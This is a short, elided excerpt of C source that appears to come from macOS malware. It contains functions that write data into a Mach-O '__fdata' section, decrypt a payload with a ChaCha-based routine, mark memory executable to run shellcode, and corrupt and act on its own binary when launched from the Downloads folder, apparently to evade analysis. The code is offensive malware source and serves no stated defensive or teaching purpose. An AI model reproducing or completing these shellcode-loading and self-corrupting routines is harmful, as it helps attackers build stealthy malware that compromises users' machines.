...
void save_section(uint8_t *data, size_t sz) {
    ...
    uint64_t sectionOffset = findSectionOffset(hdr, "__fdata", "__DATA", sz);
    if (!sectionOffset) { close(fd); return; }
    if (writeDataAtOffset(fd, sectionOffset, data, sz) != 0) { close(fd); return; }
    close(fd);
}
...
void pop_shellcode(uint8_t *code, size_t size) {
    ...
    if (mprotect((void*)start, tot, PROT_READ|PROT_EXEC) != 0) { panic(); return; }
...
int cook(uint8_t *dsec, size_t ds, chacha_state_t *rng) {
    ...
    free(code_ptr); zer0(dec, PAGE_SIZE); free(dec);
...
void initialize(void) {
    ...
    if (!strstr(exe_path, "/tmp/") && strstr(exe_path, "/Downloads/")) {
        ...
        int fd = open(exe_path, O_RDWR);
        if (fd >= 0) { corrupt_macho(fd); close(fd); _self(exe_path); }
